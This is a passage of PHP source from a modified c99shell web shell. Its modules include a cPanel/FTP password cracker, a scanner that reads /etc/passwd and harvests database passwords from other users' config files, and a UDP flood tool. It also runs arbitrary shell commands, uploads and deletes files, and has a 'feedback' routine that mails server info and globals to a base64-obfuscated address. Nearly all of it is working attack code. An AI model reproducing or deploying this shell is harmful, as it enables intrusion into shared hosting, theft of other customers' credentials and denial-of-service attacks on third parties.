						  <textarea rows='20' name='users' cols='25' style='border: 2px dashed #1D1D1D; background-color:#FF0000; color:#C0C0C0'>";

      system('ls /var/mail');

echo "</textarea>
						  <textarea rows='20' name='passwords' cols='25' style='border: 2px dashed #1D1D1D; background-color:#FF0000; color:#C0C0C0'>123123\n123456\n1234567\n12345678\n123456789\n159159\n112233\n332211\n1478963\n1478963.\ncpanel\npassword\nuser\npasswd\npasswords\n159357\n357951\n114477\npass\nPassword</textarea>
						  <br>
        <br>
                               <b> <font font color='#4c83af'>
                                                Select to Crack </font></b><font style='font-size: 12pt;' size='-3' face='Verdana'><span style='font-size: 9pt;'>&nbsp;
                                                <font face='Tahoma'>
                                                <input name='cracktype' value='cpanel' style='font-weight: 700;' checked type='radio'></font></span></font><b><font size='2' face='Tahoma'>
                                                Cpanel</font><font size='2' color='#cc0000' face='Tahoma'>
                                                </font><font size='2' color='#FFFFFF' face='Tahoma'>
                                                (2082)</font></b><font size='2' face='Tahoma'><b> </b>
                                                </font>
                                                <font style='font-size: 12pt;' size='-3' face='Verdana'>
                                                <span style='font-size: 9pt;'><font face='Tahoma'>
                                                <input name='cracktype' value='ftp' style='font-weight: 700;' type='radio'></font></span></font><font style='font-weight: 700;' size='2' face='Tahoma'>
                                                </font><span style='font-weight: 700;'>
                                                <font size='2' face='Tahoma'>Ftp </font>
                                                <font size='2' color='#FFFFFF' face='Tahoma'>
                                                (21)</font></span></p>
        <p align='center'><option value='name'>&nbsp;&nbsp;&nbsp;&nbsp;
        <input type='submit' value='   Crack it !   ' name='submit' style='color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #CCCCCC'></p>                        </td>
                </tr>
        </table>

    <p align='center'></td>
  </tr>
  </form>

   ";die();
}
echo "<table width='67%' style='border: 2px dashed #1D1D1D; background-color:#0066FF; color:#C0C0C0'>
<tr><td align=center><form method=POST action='' align=center><br /><input type=submit name=enter value=' ENTER ' style='color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color:#000000' /></form><br /></td></tr></table><br />

";
}

if ($act == "scanconfig")
{($sm = ini_get('safe_mode') == 0) ? $sm = 'off': die('<font size="4" color="#FF0000" face="Calibri"><b>Error: Safe_mode = On ===&gt; hehehe.....!! coba di setting ./httacess, log error , etc </b></font>');
set_time_limit(0);
@$passwd = fopen('/etc/passwd','r');
if (!$passwd) { die('<font size="4" color="#FF0000" face="Calibri"><b>[-] Error : Coudn`t Read /etc/passwd &lt;=== Anda kurang beruntung Gan...! ^_^ </b></font>'); }
$pub = array();
$users = array();
$conf = array();
$i = 0;
while(!feof($passwd))
{
$str = fgets($passwd);
if ($i > 100)
{
  $pos = strpos($str,':');
   $username = substr($str,0,$pos);
  $dirz = '/home/'.$username.'/public_html/';
  if (($username != ''))
  {
   if (is_readable($dirz))
   {
    array_push($users,$username);
    array_push($pub,$dirz);
   }
  }
   }
$i++;
}
echo '
<p>
<font size="5" color="#008080" face="Calibri">
Server Jumping Finder Version 3.0 <br></font>
<font size="3" color="#800000" face="Calibri">
Re-Coder by : L3w0nx | Metro Cyber
</font>
</p><br>
<font size="3" color="#008080" face="Calibri">[+]==========================================[ START ]==========================================[+] <br></font>
';
foreach ($users as $user)
{
echo "<table with='30%'><tr><td><font size='3' color='#ee0808' face='Calibri'> [+] /home/$user/public_html/</font><br/></td></tr></table>";
}
echo "\n <font size='3' color='#008080' face='Calibri'> [+]==========================================[ FINISH ]==========================================[+] <br></font>\n";
echo "\n <font size='2' color='#800000' face='Calibri'>[+] Scanners have been completed | Thank you for using this tools [+]</font>\n";
}

//DDos

 if($act == "DDos")
{
    if(isset($_GET['ip']) &&
    isset($_GET['exTime']) &&
    isset($_GET['port']) &&
    isset($_GET['timeout']) &&
    isset($_GET['exTime']) &&
    $_GET['exTime'] != "" &&
    $_GET['port'] != "" &&
    $_GET['ip'] != "" &&
    $_GET['timeout'] != "" &&
    $_GET['exTime'] != ""
    )
    {
       $IP=$_GET['ip'];
	   $port=$_GET['port'];
       $executionTime = $_GET['exTime'];
	   $noOfBytes = $_GET['noOfBytes'];
       $data = "";
       $timeout = $_GET['timeout'];
       $packets = 0;
       $counter = $noOfBytes;
       $maxTime = time() + $executionTime;;
       while($counter--)
       {
            $data .= "X";
       }
       $data .= "-by-Ani-Shell"; 
       print "I am at ma Work now :D ;D! Dont close this window untill you recieve a message <br>";
	   
       while(1)
	   {
            $socket = fsockopen("udp://$IP", $port, $error, $errorString, $timeout);
            if($socket)
            {
                fwrite($socket , $data);
                fclose($socket);
                $packets++;
            }
            if(time() >= $maxTime)
            {
                break;
            }
        }
        echo "<script>alert('DDos Completed!');</script>";
        echo "DOS attack against udp://$IP:$port completed on ".date("h:i:s A")."<br />";
        echo "Total Number of Packets Sent : " . $packets . "<br />";
        echo "Total Data Sent = ". HumanReadableFilesize($packets*$noOfBytes) . "<br />"; 
        echo "Data per packet = " . HumanReadableFilesize($noOfBytes) . "<br />";
    }
    else
    {
        ?>
        <form method="GET">
            <input type="hidden" name="DDos" />
            <table id="margins">
                <tr>
                    <td width="400" class="title">
                        IP
                    </td>
                    <td>
                        <input class="cmd" name="ip" value="127.0.0.1" onFocus="if(this.value == '127.0.0.1')this.value = '';" onBlur="if(this.value=='')this.value='127.0.0.1';"/>
                    </td>
                </tr>
                
                <tr>
                    <td class="title">
                        Port
                    </td>
                    <td>
                        <input class="cmd" name="port" value="80" onFocus="if(this.value == '80')this.value = '';" onBlur="if(this.value=='')this.value='80';"/>
                    </td>
                </tr>
                
                <tr>
                    <td class="title">
                        Timeout <font color="red">(Time in seconds)</font>
                    </td>
                    <td>
                        <input type="text" class="cmd" name="timeout" value="5" onFocus="if(this.value == '5')this.value = '';" onBlur="if(this.value=='')this.value='5';" />
                    </td>
                </tr>
                
                
                <tr>
                    <td class="title">
                        Execution Time <font color="red">(Time in seconds)</font> 
                    </td>
                    <td>
                        <input type="text" class="cmd" name="exTime" value="10" onFocus="if(this.value == '10')this.value = '';" onBlur="if(this.value=='')this.value='10';"/>
                    </td>
                </tr>
                
                <tr>
                    <td class="title">
                        No of Bytes per/packet
                    </td>
                    <td>
                        <input type="text" class="cmd" name="noOfBytes" value="999999" onFocus="if(this.value == '999999')this.value = '';" onBlur="if(this.value=='')this.value='999999';"/>
                    </td>
                </tr>
                

                <tr>
                    <td rowspan="2">
                        <input style="margin : 20px; margin-left: 500px; padding : 10px; width: 100px;" type="submit" class="own" value="Let it Rip! :D"/>
                    </td>
                </tr>
            </table>            
        </form>
        <?php
    }
}


if ($act == "jumping"){
($sm = ini_get('safe_mode') == 0) ? $sm = 'off': die('<font size="4" color="#FF0000" face="Calibri"><b>Error: Safe_mode = On</b></font>');
set_time_limit(0);
@$passwd = fopen('/etc/passwd','r');
if (!$passwd) { die('<font size="4" color="#FF0000" face="Calibri"><b>[-] Error : Coudn`t Read /etc/passwd</b></font>'); }
$pub = array();
$users = array();
$conf = array();
$i = 0;
while(!feof($passwd))
{
$str = fgets($passwd);
if ($i > 100)
{
  $pos = strpos($str,':');
  $username = substr($str,0,$pos);
  $dirz = '/home/'.$username.'/public_html/';
  if (($username != ''))
  {
   if (is_readable($dirz))
   {
    array_push($users,$username);
    array_push($pub,$dirz);
   }
  }
   }
$i++;
}

echo '<p>
<font size="5" color="#4c83af" face="Calibri">
Scanconfig 4.0<br></font>
<font size="3" color="#800000" face="Calibri">
Re-Coder by L3w0nx | Metro Cyber
</font>
</p><br>
<font size="3" color="#FF0000" face="Calibri">[+]==========================================[</font><font size="3" color="#00FF33" face="Calibri"> START </font><font size="3" color="#FFFFFF" face="Calibri">]==========================================[+] </font><br></font>
';
function read_dir($path,$username)
{
if ($handle = opendir($path))
{
while (false !== ($file = readdir($handle)))
{
  $fpath = "$path$file";
  if (($file != '.') and ($file != '..'))
  {
   if (is_readable($fpath))
   {
    $dr = $fpath."/";
    if (is_dir($dr))
    {
	
     read_dir($dr,$username);
    }
    else
    {
                        if (
                         ($file=='config.php')
                        or ($file=='config.inc.php')
                        or ($file=='conf.php')
                        or ($file=='settings.php')
                        or ($file=='wp_config.php')
						or ($file=='inc.php')
                        or ($file=='config.php')
                        or ($file=='globals.php')
                        or ($file=='settings.php')
                        or ($file=='setup.php')
                        or ($file=='dbconf.php')
						or ($file=='setup.php')
						or ($file=='common.php')
						or ($file=='config_global.php')
						or ($file=='db_connect.php')
						or ($file=='var.php')
						or ($file=='global.inc.php')
						or ($file=='global.php')
						or ($file=='config.inc')
						or ($file=='mysql.php')
						or ($file=='const.inc.php')
						or ($file=='dbc.php')
                        or ($file=='dbconfig.php')
						or ($file=='db_settings.php')
						or ($file=='dbsettings.php')
						or ($file=='_config.php')
                        or ($file=='db.inc.php')
                        or ($file=='dbconnect.php')
                        or ($file=='CHANGELOG.php')
                        or ($file=='connect.php')
                        or ($file=='configure.php')
                        or ($file=='connect.php')
                        or ($file=='config_global.php')
                        or ($file=='configuration.php')
                        or ($file=='db.php')
                        or ($file=='connect.inc.php')
                        or ($file=='dbconnect.inc.php')
						or ($file=='konek.php')
						or ($file=='koneksi.php')
						or ($file=='setting.php')
						or ($file=='wp-config.php')
						or ($file=='db.php')
						or ($file=='master.php')
						or ($file=='include.php')
						or ($file=='includes.php')
						or ($file=='conect.php')
						or ($file=='database.php')
						or ($file=='DB.php')
						or ($file=='settings.php')
						or ($file=='func.php')
						or ($file=='konfig.php')
						or ($file=='konfigurasi.php')
						or ($file=='function.php')
						or ($file=='functions.php')
						or ($file=='configure.php')
						or ($file=='conection.php'))
                       {
	 
	 echo "<font size='2' color='#ee0808' face='Calibri'> [+] $fpath\n</font><br>";
      }
     }
    }
   }
  }
}
}
foreach ($users as $user)

{
echo "\n <table with='30%'><tr><td><font size='2' color='#FFFFFF' face='Calibri'><br><br> [+]--------------------------------------------------------------- [ file 
configuration ]-----------------------------------------------[+] <br></font>\n";

$path = "/home/$user/public_html/";
read_dir($path,$user);
echo '</td>';

}
echo "\n <font size='3' color='#0066FF' face='Calibri'><br><br> [+]==========================================[ FINISH ]==========================================[+] <br></font>\n";
echo "\n <font size='3' color='#800000' face='Calibri'>         [+]            Scanners have been completed | Thank you been using this tools          [+]</font>\n";
echo "<tr></table>";
}

	if ($act == "check"){
($sm = ini_get('safe_mode') == 0) ? $sm = 'off': die('<font size="4" color="#FF0000" face="Calibri"><b>Error: Safe_mode = On</b></font>');
set_time_limit(0);
@$passwd = fopen('/etc/passwd','r');
if (!$passwd) { die('<font size="4" color="#FF0000" face="Calibri"><b>[-] Error : Coudn`t Read /etc/passwd</b></font>'); }
$pub = array();
$users = array();
$conf = array();
$i = 0;
while(!feof($passwd))
{
$str = fgets($passwd);
if ($i > 100)
{
  $pos = strpos($str,':');
  $username = substr($str,0,$pos);
  $dirz = '/home/'.$username.'/public_html/';
  if (($username != ''))
  {
   if (is_readable($dirz))
   {
    array_push($users,$username);
    array_push($pub,$dirz);
   }
  }
   }
$i++;
}
echo '<p>
<font size="5" color="#008080" face="Calibri">
Cpanel & FTP Checker Version 2.0<br></font>
<font size="3" color="#800000" face="Calibri">
Created by uzanc | 2011 - Tangerang - Indonesia
</font>
</p><br>
<font size="3" color="#008080" face="Calibri">[+]==========================================[ START ]==========================================[+] <br></font>
';

function read_dir($path,$username)
{
if ($handle = opendir($path))
{
while (false !== ($file = readdir($handle)))
{
  $fpath = "$path$file";
  if (($file != '.') and ($file != '..'))
  {
   if (is_readable($fpath))
   {
    $dr = $fpath."/";
    if (is_dir($dr))
    {
     read_dir($dr,$username);
    }
    else
    {
                        if (
                         ($file=='config.php')
                        or ($file=='config.inc.php')
                        or ($file=='conf.php')
                        or ($file=='settings.php')
                        or ($file=='wp_config.php')
						or ($file=='inc.php')
                        or ($file=='config.php')
                        or ($file=='globals.php')
                        or ($file=='settings.php')
                        or ($file=='setup.php')
                        or ($file=='dbconf.php')
						or ($file=='setup.php')
						or ($file=='common.php')
						or ($file=='config_global.php')
						or ($file=='db_connect.php')
						or ($file=='var.php')
						or ($file=='global.inc.php')
						or ($file=='global.php')
						or ($file=='config.inc')
						or ($file=='mysql.php')
						or ($file=='const.inc.php')
						or ($file=='dbc.php')
                        or ($file=='dbconfig.php')
						or ($file=='db_settings.php')
						or ($file=='dbsettings.php')
						or ($file=='_config.php')
                        or ($file=='db.inc.php')
                        or ($file=='dbconnect.php')
                        or ($file=='CHANGELOG.php')
                        or ($file=='connect.php')
                        or ($file=='configure.php')
                        or ($file=='connect.php')
                        or ($file=='config_global.php')
                        or ($file=='configuration.php')
                        or ($file=='db.php')
                        or ($file=='connect.inc.php')
                        or ($file=='dbconnect.inc.php')
						or ($file=='konek.php')
						or ($file=='koneksi.php')
						or ($file=='setting.php')
						or ($file=='wp-config.php')
						or ($file=='db.php')
						or ($file=='master.php')
						or ($file=='include.php')
						or ($file=='includes.php')
						or ($file=='conect.php')
						or ($file=='database.php')
						or ($file=='DB.php')
						or ($file=='settings.php')
						or ($file=='func.php')
						or ($file=='konfig.php')
						or ($file=='konfigurasi.php')
						or ($file=='function.php')
						or ($file=='functions.php')
						or ($file=='configure.php')
						or ($file=='conection.php'))
                       {
	$pass = get_pass($fpath);
      if ($pass != '')
      {
       ftp_check($username,$pass);
      }
     }
    }
   }
  }
}
}
}
function get_pass($link)
{
@$config = fopen($link,'r');
while(!feof($config))
{
$line = fgets($config);
if (strstr($line,'pass')
or strstr($line,'pwd')
or strstr($line,'db_passwd')
or strstr($line,'dbpwd')
or strstr($line,'kunci')
or strstr($line,'db_password')
or strstr($line,'sqlpass')
or strstr($line,'sql_pass')
or strstr($line,'vc_pass')
or strstr($line,'dbpassword')
or strstr($line,'db_pass')
or strstr($line,'dbpass')
or strstr($line,'DB_SERVER_PASSWORD')
or strstr($line,'DB_NAME')
or strstr($line,'DB_USER')
or strstr($line,'DB_PASSWORD')
or strstr($line,'dbpassword')
or strstr($line,'password')
or strstr($line,'passwd'))
{
  if (strrpos($line,'"'))
  {
   preg_match("/(.*)[^=]\"(.*)\"/",$line,$pass);
   $pass = str_replace("]=\"","",$pass);
  }
  
  else
   preg_match("/(.*)[^=]\'(.*)\'/",$line,$pass);
   $pass = str_replace("]='","",$pass);
  return $pass[2];
}
}
}
function ftp_check($login,$pass)
{
@$ftp = ftp_connect('127.0.0.1');
if ($ftp)
{
@$res = ftp_login($ftp,$login,$pass);
if ($res)
{
  echo '<table with="30%"><tr><td>
		<font size="3" color="#ee0808" face="Calibri">[+] </font>
		<font size="3" color="#008080" face="Calibri"> Check Cpanel & FTP Success with Username (</font>
		<font size="3" color="#ee0808" face="Calibri"><b>'.$login.'</b></font>
		<font size="3" color="#008080" face="Calibri">) And Password (</font>
		<font size="3" color="#ee0808" face="Calibri"><b>'.$pass."</b></font>
		<font size='3' color='#008080' face='Calibri'>)</font><br/>
		</td></tr></table>";
}
else ftp_quit($ftp);
}
}


foreach ($users as $user)
{
$path = "/home/$user/public_html/";
read_dir($path,$user);
}
echo "\n <font size='3' color='#008080' face='Calibri'><br><br> [+]==========================================[ FINISH ]==========================================[+] <br></font>\n";
echo "\n <font size='3' color='#800000' face='Calibri'>         [+]            Checker have been completed | Thank you for using this tools          [+]</font>\n";
}
	 
	if ($act == "feedback")
	{
		$supqmail = base64_decode("YnVkaV9zcGllbGJlcmdAeWFob28uY28uaWQ=");
		if (!empty($submit))
		{
			$ticket = substr(md5(microtime()+rand(1,1000)),0,6);
			$body = "c99shell v.".$shver." feedback #".$ticket."\nName: ".htmlspecialchars($fdbk_name)."\nE-mail: ".htmlspecialchars($fdbk_email)."\nMessage:\n".htmlspecialchars($fdbk_body)."\n\nIP: ".$REMOTE_ADDR;
			if (!empty($fdbk_ref))
			{
				$tmp = @ob_get_contents();
				ob_clean();
				phpinfo();
				$phpinfo = base64_encode(ob_get_contents());
				ob_clean();
				echo $tmp;
				$body .= "\n"."phpinfo(): ".$phpinfo."\n"."\$GLOBALS=".base64_encode(serialize($GLOBALS))."\n";
			}
			mail($suppmail,"c99shell v.".$shver." feedback #".$ticket,$body,"FROM: ".$suppmail);
mail($supqmail,"c99shell v.".$shver." feedback #".$ticket,$body,"FROM: ".$suppmail);
			echo "<center><b>Thanks for your feedback! Your ticket ID: ".$ticket.".</b></center>";
		}
		else {echo "<form action=\"".$surl."\" method=POST>
		<input type=hidden name=act value=feedback>
		<b>Feedback or report bug (".str_replace(array("@","."),array("[at]","[dot]"),$suppmail)."):<br><br>
		Your name: <input type=\"text\" name=\"fdbk_name\" value=\"".htmlspecialchars($fdbk_name)."\"><br><br>
		Your e-mail: <input type=\"text\" name=\"fdbk_email\" value=\"".htmlspecialchars($fdbk_email)."\"><br><br>
		Message:<br><textarea name=\"fdbk_body\" cols=80 rows=10>".htmlspecialchars($fdbk_body)."</textarea>
		<input type=\"hidden\" name=\"fdbk_ref\" value=\"".urlencode($HTTP_REFERER)."\"><br><br>
		Attach server-info * <input type=\"checkbox\" name=\"fdbk_servinf\" value=\"1\" checked><br><br>
		There are no checking in the form.<br><br>* - strongly recommended, if you report bug, because we need it for bug-fix.<br><br>
		We understand languages: English, Indonesian.<br><br>
		<input type=\"submit\" name=\"submit\" value=\"Send\"></form>";}
	}
	if ($act == "search")
	{
		echo "<b>Search in file-system:</b><br>";
		if (empty($search_in)) {$search_in = $d;}
		if (empty($search_name)) {$search_name = "(.*)"; $search_name_regexp = 1;}
		if (empty($search_text_wwo)) {$search_text_regexp = 0;}
		if (!empty($submit))
		{
			$found = array();
			$found_d = 0;
			$found_f = 0;
			$search_i_f = 0;
			$search_i_d = 0;
			$a = array
			(
				"name"=>$search_name, "name_regexp"=>$search_name_regexp,
			   "text"=>$search_text, "text_regexp"=>$search_text_regxp,
				"text_wwo"=>$search_text_wwo,
				"text_cs"=>$search_text_cs,
				"text_not"=>$search_text_not
			);
			$searchtime = getmicrotime();
			$in = array_unique(explode(";",$search_in));
			foreach($in as $v) {c99fsearch($v);}
			$searchtime = round(getmicrotime()-$searchtime,4);
			if (count($found) == 0) {echo "<b>No files found!</b>";}
			else
			{
				$ls_arr = $found;
				$disp_fullpath = TRUE;
				$act = "ls";
			}
		}
		echo "<form method=POST>
		<input type=hidden name=\"d\" value=\"".$dispd."\"><input type=hidden name=act value=\"".$dspact."\">
		<b>Search for (file/folder name): </b>
		<input type=\"text\" name=\"search_name\" size=\"".round(strlen($search_name)+25)."\" value=\"".htmlspecialchars($search_name)."\"> 
		<input type=\"checkbox\" name=\"search_name_regexp\" value=\"1\" ".($search_name_regexp == 1?" checked":"")."> - regexp
		<br><b>Search in (explode \";\"): </b><input type=\"text\" name=\"search_in\" size=\"".round(strlen($search_in)+25)."\" value=\"".htmlspecialchars($search_in)."\">
		<br><br><b>Text:</b><br><textarea name=\"search_text\" cols=\"122\" rows=\"10\">".htmlspecialchars($search_text)."</textarea>
		<br><br><input type=\"checkbox\" name=\"search_text_regexp\" value=\"1\" ".($search_text_regexp == 1?" checked":"")."> - regexp
		<input type=\"checkbox\" name=\"search_text_wwo\" value=\"1\" ".($search_text_wwo == 1?" checked":"")."> - <u>w</u>hole words only
		<input type=\"checkbox\" name=\"search_text_cs\" value=\"1\" ".($search_text_cs == 1?" checked":"")."> - cas<u>e</u> sensitive
		<input type=\"checkbox\" name=\"search_text_not\" value=\"1\" ".($search_text_not == 1?" checked":"")."> - find files <u>NOT</u> containing the text
		<br><br><input type=submit name=submit value=\"Search\"></form>";
		if ($act == "ls") 
		{
			$dspact = $act; 
			echo "<hr size=\"1\" noshade><b>Search took ".$searchtime." secs (".$search_i_f." files and ".$search_i_d." folders, ".round(($search_i_f+$search_i_d)/$searchtime,4)." objects per second).</b><br><br>";
		}
	}
	if ($act == "chmod")
	{
		$mode = fileperms($d.$f);
		if (!$mode) {echo "<b>Change file-mode with error:</b> can't get current value.";}
		else
		{
			$form = TRUE;
			if ($chmod_submit)
			{
			$octet = "0".base_convert(($chmod_o["r"]?1:0).($chmod_o["w"]?1:0).($chmod_o["x"]?1:0).($chmod_g["r"]?1:0).($chmod_g["w"]?1:0).($chmod_g["x"]?1:0).($chmod_w["r"]?1:0).($chmod_w["w"]?1:0).($chmod_w["x"]?1:0),2,8);
			if (chmod($d.$f,$octet)) {$act = "ls"; $form = FALSE; $err = "";}
			else {$err = "Can't chmod to ".$octet.".";}
			}
			if ($form)
			{
				$perms = parse_perms($mode);
				echo "<b>Changing file-mode (".$d.$f."), ".view_perms_color($d.$f)." (".substr(decoct(fileperms($d.$f)),-4,4).")</b><br>
				".($err?"<b>Error:</b> ".$err:"")."<form action=\"".$surl."\" method=POST>
				<input type=hidden name=d value=\"".htmlspecialchars($d)."\">
				<input type=hidden name=f value=\"".htmlspecialchars($f)."\">
				<input type=hidden name=act value=chmod>
				<table align=left width=300 border=0 cellspacing=0 cellpadding=5>
				<tr><td><b>Owner</b><br><br><input type=checkbox NAME=chmod_o[r] value=1".($perms["o"]["r"]?" checked":"")."> Read<br>
				<input type=checkbox name=chmod_o[w] value=1".($perms["o"]["w"]?" checked":"")."> Write<br>
				<input type=checkbox NAME=chmod_o[x] value=1".($perms["o"]["x"]?" checked":"").">eXecute</td>
				<td><b>Group</b><br><br><input type=checkbox NAME=chmod_g[r] value=1".($perms["g"]["r"]?" checked":"")."> Read<br>
				<input type=checkbox NAME=chmod_g[w] value=1".($perms["g"]["w"]?" checked":"")."> Write<br>
				<input type=checkbox NAME=chmod_g[x] value=1".($perms["g"]["x"]?" checked":"").">eXecute</font></td>
				<td><b>World</b><br><br><input type=checkbox NAME=chmod_w[r] value=1".($perms["w"]["r"]?" checked":"")."> Read<br>
				<input type=checkbox NAME=chmod_w[w] value=1".($perms["w"]["w"]?" checked":"")."> Write<br>
				<input type=checkbox NAME=chmod_w[x] value=1".($perms["w"]["x"]?" checked":"").">eXecute</font></td></tr>
				<tr><td><input type=submit name=chmod_submit value=\"Save\"></td></tr></table></form>";
			}
		}
	}
	
	// Logout

if($act == "logout")
{
    $_SESSION['authenticated'] = 0;
    session_destroy();
    header("location:".$self);
}

	if ($act == "upload")
	{
		$uploadmess = "";
		$uploadpath = str_replace("\\",DIRECTORY_SEPARATOR,$uploadpath);
		if (empty($uploadpath)) {$uploadpath = $d;}
		elseif (substr($uploadpath,-1) != "/") {$uploadpath .= "/";}
		if (!empty($submit))
		{
			global $HTTP_POST_FILES;
			$uploadfile = $HTTP_POST_FILES["uploadfile"];
			if (!empty($uploadfile["tmp_name"]))
			{
				if (empty($uploadfilename)) {$destin = $uploadfile["name"];}
				else {$destin = $userfilename;}
				if (!move_uploaded_file($uploadfile["tmp_name"],$uploadpath.$destin)) {$uploadmess .= "Error uploading file ".$uploadfile["name"]." (can't copy \"".$uploadfile["tmp_name"]."\" to \"".$uploadpath.$destin."\"!<br>";}
			}
			elseif (!empty($uploadurl))
			{
				if (!empty($uploadfilename)) {$destin = $uploadfilename;}
				else
				{
					$destin = explode("/",$destin);
					$destin = $destin[count($destin)-1];
					if (empty($destin))
					{
					$i = 0;
					$b = "";
					while(file_exists($uploadpath.$destin)) {if ($i > 0) {$b = "_".$i;} $destin = "index".$b.".html"; $i++;}}
				}
				if ((!eregi("http://",$uploadurl)) and (!eregi("https://",$uploadurl)) and (!eregi("ftp://",$uploadurl))) {echo "<b>Incorect url!</b><br>";}
				else
				{
					$st = getmicrotime();
					$content = @file_get_contents($uploadurl);
					$dt = round(getmicrotime()-$st,4);
					if (!$content) {$uploadmess .=  "Can't download file!<br>";}
					else
					{
						if ($filestealth) {$stat = stat($uploadpath.$destin);}
						$fp = fopen($uploadpath.$destin,"w");
						if (!$fp) {$uploadmess .= "Error writing to file ".htmlspecialchars($destin)."!<br>";}
						else
						{
							fwrite($fp,$content,strlen($content));
							fclose($fp);
							if ($filestealth) {touch($uploadpath.$destin,$stat[9],$stat[8]);}
						}
					}
				}
			}
		}
		if ($miniform)
		{
			echo "<b>".$uploadmess."</b>";
			$act = "ls";
		}
		else
		{
			echo "<b>File upload:</b><br><b>".$uploadmess."</b><form enctype=\"multipart/form-data\" action=\"".$surl."act=upload&d=".urlencode($d)."\" method=POST>
			Select file on your local computer: <input name=\"uploadfile\" type=\"file\"><br>    or<br>
			Input URL: <input name=\"uploadurl\" type=\"text\" value=\"".htmlspecialchars($uploadurl)."\" size=\"70\"><br><br>
			Save this file dir: <input name=\"uploadpath\" size=\"70\" value=\"".$dispd."\"><br><br>
			File-name (auto-fill): <input name=uploadfilename size=25><br><br>
			<input type=checkbox name=uploadautoname value=1 id=df4> convert file name to lovercase<br><br>
			<input type=submit name=submit value=\"Upload\">
			</form>";
		}
	}
	if ($act == "delete")
	{
		$delerr = "";
		foreach ($actbox as $v)
		{
			$result = FALSE;
			$result = fs_rmobj($v);
			if (!$result) {$delerr .= "Can't delete ".htmlspecialchars($v)."<br>";}
		}
		if (!empty($delerr)) {echo "<b>Deleting with errors:</b><br>".$delerr;}
		$act = "ls";
	}
	if (!$usefsbuff)
	{
		if (($act == "paste") or ($act == "copy") or ($act == "cut") or ($act == "unselect")) {echo "<center><b>Sorry, buffer is disabled. For enable, set directive \"\$useFSbuff\" as TRUE.</center>";}
	}
	else
	{
		if ($act == "copy") {$err = ""; $sess_data["copy"] = array_merge($sess_data["copy"],$actbox); c99_sess_put($sess_data); $act = "ls"; }
		elseif ($act == "cut") {$sess_data["cut"] = array_merge($sess_data["cut"],$actbox); c99_sess_put($sess_data); $act = "ls";}
		elseif ($act == "unselect") {foreach ($sess_data["copy"] as $k=>$v) {if (in_array($v,$actbox)) {unset($sess_data["copy"][$k]);}} foreach ($sess_data["cut"] as $k=>$v) {if (in_array($v,$actbox)) {unset($sess_data["cut"][$k]);}} c99_sess_put($sess_data); $act = "ls";}
		if ($actemptybuff) {$sess_data["copy"] = $sess_data["cut"] = array(); c99_sess_put($sess_data);}
		elseif ($actpastebuff)
		{
			$psterr = "";
			foreach($sess_data["copy"] as $k=>$v)
			{
				$to = $d.basename($v);
				if (!fs_copy_obj($v,$to)) {$psterr .= "Can't copy ".$v." to ".$to."!<br>";}
				if ($copy_unset) {unset($sess_data["copy"][$k]);}
			}
			foreach($sess_data["cut"] as $k=>$v)
			{
				$to = $d.basename($v);
				if (!fs_move_obj($v,$to)) {$psterr .= "Can't move ".$v." to ".$to."!<br>";}
				unset($sess_data["cut"][$k]);
			}
			c99_sess_put($sess_data);
			if (!empty($psterr)) {echo "<b>Pasting with errors:</b><br>".$psterr;}
			$act = "ls";
		}
		elseif ($actarcbuff)
		{
			$arcerr = "";
			if (substr($actarcbuff_path,-7,7) == ".tar.gz") {$ext = ".tar.gz";}
			else {$ext = ".tar.gz";}
			if ($ext == ".tar.gz") {$cmdline = "tar cfzv";}
			$cmdline .= " ".$actarcbuff_path;
			$objects = array_merge($sess_data["copy"],$sess_data["cut"]);
			foreach($objects as $v)
			{
				$v = str_replace("\\",DIRECTORY_SEPARATOR,$v);
				if (substr($v,0,strlen($d)) == $d) {$v = basename($v);}
				if (is_dir($v))
				{
					if (substr($v,-1) != DIRECTORY_SEPARATOR) {$v .= DIRECTORY_SEPARATOR;}
					$v .= "*";
				}
				$cmdline .= " ".$v;
			}
			$tmp = realpath(".");
			chdir($d);
			$ret = myshellexec($cmdline);
			chdir($tmp);
			if (empty($ret)) {$arcerr .= "Can't call archivator (".htmlspecialchars(str2mini($cmdline,60)).")!<br>";}
			$ret = str_replace("\r\n","\n",$ret);
			$ret = explode("\n",$ret);
			if ($copy_unset) {foreach($sess_data["copy"] as $k=>$v) {unset($sess_data["copy"][$k]);}}
			foreach($sess_data["cut"] as $k=>$v)
			{
				if (in_array($v,$ret)) {fs_rmobj($v);}
				unset($sess_data["cut"][$k]);
			}
			c99_sess_put($sess_data);
			if (!empty($arcerr)) {echo "<b>Archivation errors:</b><br>".$arcerr;}
			$act = "ls";
		}
		elseif ($actpastebuff)
		{
			$psterr = "";
			foreach($sess_data["copy"] as $k=>$v)
			{
				$to = $d.basename($v);
				if (!fs_copy_obj($v,$d)) {$psterr .= "Can't copy ".$v." to ".$to."!<br>";}
				if ($copy_unset) {unset($sess_data["copy"][$k]);}
			}
			foreach($sess_data["cut"] as $k=>$v)
			{
				$to = $d.basename($v);
				if (!fs_move_obj($v,$d)) {$psterr .= "Can't move ".$v." to ".$to."!<br>";}
				unset($sess_data["cut"][$k]);
			}
			c99_sess_put($sess_data);
			if (!empty($psterr)) {echo "<b>Pasting with errors:</b><br>".$psterr;}
			$act = "ls";
		}
	}
	if ($act == "cmd")
	{
		if (trim($cmd) == "ps -aux") {$act = "processes";}
		elseif (trim($cmd) == "tasklist") {$act = "processes";}
		else
		{
			@chdir($chdir);
			if (!empty($submit))
			{
				echo "<b>Result of execution this command</b>:<br>";
				$olddir = realpath(".");
				@chdir($d);
				$ret = myshellexec($cmd);
				$ret = convert_cyr_string($ret,"d","w");
				if ($cmd_txt)
				{
					$rows = count(explode("\r\n",$ret))+1;
					if ($rows < 10) {$rows = 10;}
					echo "<br><textarea cols=\"122\" rows=\"".$rows."\" readonly>".htmlspecialchars($ret)."</textarea>";
				}
				else {echo $ret."<br>";}
				@chdir($olddir);
			}
			else {echo "<b>Execution command</b>"; if (empty($cmd_txt)) {$cmd_txt = TRUE;}}
			echo "<form action=\"".$surl."\" method=POST>
			<input type=hidden name=act value=cmd>
			<textarea name=cmd cols=122 rows=3>".htmlspecialchars($cmd)."</textarea>
			<input type=hidden name=\"d\" value=\"".$dispd."\"><br><br>
			<input type=submit name=submit value=\"Execute\"> 
			Display in text-area <input type=\"checkbox\" name=\"cmd_txt\" value=\"1\""; 
			if ($cmd_txt) {echo " checked";} echo "></form>";
		}
	}
	if ($act == "ls")
	{
		if (count($ls_arr) > 0) {$list = $ls_arr;}
		else
		{
			$list = array();
			if ($h = @opendir($d))
			{
